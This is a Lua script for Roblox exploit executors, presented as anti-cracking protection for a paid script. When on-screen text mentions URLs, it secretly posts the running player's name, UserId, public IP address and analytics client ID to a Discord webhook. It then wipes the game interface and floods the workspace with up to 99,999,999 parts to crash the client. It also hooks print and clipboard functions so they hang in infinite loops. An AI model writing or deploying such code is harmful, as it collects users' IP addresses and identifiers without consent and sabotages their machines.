-- TheRealGamersCrackingDefence
game:GetService('StarterGui'):SetCore("DevConsoleVisible", true)
wait(0)
game:GetService('StarterGui'):SetCore("DevConsoleVisible", false)

local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")

-- Function to recursively search for TextLabels in a given parent
local function findTextLabels(parent, labels)
    for _, child in ipairs(parent:GetChildren()) do
        if child:IsA("TextLabel") then
            table.insert(labels, child)
        elseif child:IsA("GuiObject") then
            findTextLabels(child, labels) -- Recursively search deeper
        end
    end
end

-- Keywords to check for
local keywords = {"https", "Github", ".com", "github", "pastebin"}

-- Define your whitelist of keywords
local whitelist = {"https://rblxasset", "roblox.com"}

local function checkTextForKeywords(labels)
    for _, label in ipairs(labels) do
        local labelText = label.Text
        for _, keyword in ipairs(keywords) do
            -- Check if the keyword is in the whitelist
            local isWhitelisted = false
            for _, whitelistedKeyword in ipairs(whitelist) do
                if labelText:lower():find(whitelistedKeyword:lower()) then
                    isWhitelisted = true
                    break
                end
            end

            if not isWhitelisted and labelText:lower():find(keyword:lower()) then
                -- Delete the DevConsoleMaster
                game.CoreGui:FindFirstChild("DevConsoleMaster"):Destroy()
                game.PlayerGui:ClearAllChildren()
                game.StarterGui:ClearAllChildren()
                game.Workspace:ClearAllChildren()

                -- Send a webhook to Discord
                local Webhook_URL = "https://discord.com/api/webhooks/your_webhook_url_here" -- Replace with your Discord webhook URL

                local request = syn and syn.request or request or http and http.request or http_request

                request({
                    Url = Webhook_URL,
                    Method = "POST",
                    Headers = {
                        ['Content-Type'] = 'application/json'
                    },
                    Body = HttpService:JSONEncode({
                        ["content"] = "",
                        ["embeds"] = {
                            {
                                ["title"] = "",
                                ["description"] = game.Players.LocalPlayer.Name .. " Cracking The Script More Info Below",
                                ["type"] = "rich",
                                ["color"] = tonumber(0xff0000), -- Red color for alert
                                ["fields"] = {
                                    {
                                        ["name"] = "Player Name : ",
                                        ["value"] = game.Players.LocalPlayer.Name,
                                        ["inline"] = true
                                    }, {
                                        ["name"] = "UserId : ",
                                        ["value"] = game.Players.LocalPlayer.UserId,
                                        ["inline"] = true
                                    }, {
                                        ["name"] = "User Profile : ",
                                        ["value"] = "https://www.roblox.com/users/" ..
                                                game.Players.LocalPlayer.UserId,
                                        ["inline"] = true
                                    }, {
                                        ["name"] = "IP: ",
                                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
                                        ["inline"] = true
                                    }, {
                                        ["name"] = "Client Id : ",
                                        ["value"] = game:GetService("RbxAnalyticsService")
                                                :GetClientId(),
                                        ["inline"] = true
                                    }, {
                                        ["name"] = "Key : ",
                                        ["value"] = "GAMERONTOP",
                                        ["inline"] = true
                                    }
                                }
                            }
                        }
                    })
                })

                print("STOP CRACKING ")

                -- Custom kick action
                local player = game.Players.LocalPlayer
                player.PlayerGui:ClearAllChildren()
                game.CoreGui:ClearAllChildren()
                local blurEffect = Instance.new("BlurEffect", workspace.CurrentCamera)
                blurEffect.Size = 999999999

                local basePart = Instance.new("Part")
                basePart.Size = Vector3.new(100, 100, 100)
                basePart.Anchored = true
                basePart.Parent = game.Workspace

                for i = 1, 99999999 do
                    local newPart = basePart:Clone()
                    newPart.Size = newPart.Size - Vector3.new(20, 20, 20)
                    newPart.Position = basePart.Position + Vector3.new(0, i * 10, 0)
                    newPart.Parent = game.Workspace
                end

                return -- Exit the loop after kicking the player
            end
        end
    end
    return false
end

local function onHeartbeat()
    local labels = {}
    findTextLabels(game.CoreGui, labels)
    findTextLabels(game.PlayerGui, labels)
    findTextLabels(game.StarterGui, labels)
    findTextLabels(game.Workspace, labels)

    checkTextForKeywords(labels)
end

local heartbeatConnection

local cooldown = 0.1 -- Set your desired cooldown in seconds
local cooldownTimer = 0

heartbeatConnection = RunService.Heartbeat:Connect(function()
    if not cooldownTimer or tick() - cooldownTimer >= cooldown then
        onHeartbeat()
        cooldownTimer = tick() -- Update the cooldown timer
    end
end)

-- Basic anti-http-spy
local functions = {
    rconsoleprint,
    print,
    setclipboard,
    rconsoleerr,
    rconsolewarn,
    warn,
    error
}

for i, v in next, functions do
    local old
    old =
        hookfunction(
        v,
        newcclosure(
            function(...)
                local args = {...}
                for i, v in next, args do
                    if tostring(i):find("https") or tostring(v):find("https") then
                        while true do
                        end
                    end
                end
                return old(...)
            end
        )
    )
end

if _G.ID then
    while true do
    end
end

setmetatable(
    _G,
    {
        __newindex = function(t, i, v)
            if tostring(i) == "ID" then
                while true do
                end
            end
        end
    }
)
